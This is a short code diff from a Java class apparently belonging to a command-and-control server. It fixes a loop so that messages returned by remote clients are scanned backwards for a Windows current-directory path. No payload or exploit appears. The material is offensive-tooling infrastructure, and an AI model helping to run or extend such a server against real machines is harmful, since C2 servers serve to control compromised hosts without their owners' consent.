@@ -280,7 +280,7 @@ public class C2ServerUserHandler implements Runnable{
             // Iterate through each message returned from the client to find the current directory
             synchronized(messageQueue){
                 Object messages[] = messageQueue.toArray();
-                for(int i = messages.length - 1; i > 0; i++){
+                for(int i = messages.length - 1; i > 0; i--){
                     System.out.println(messages[i].toString());
                     Matcher matcher = windowsCompiledRegexPattern.matcher(messages[i].toString());
                     if(matcher.matches()){
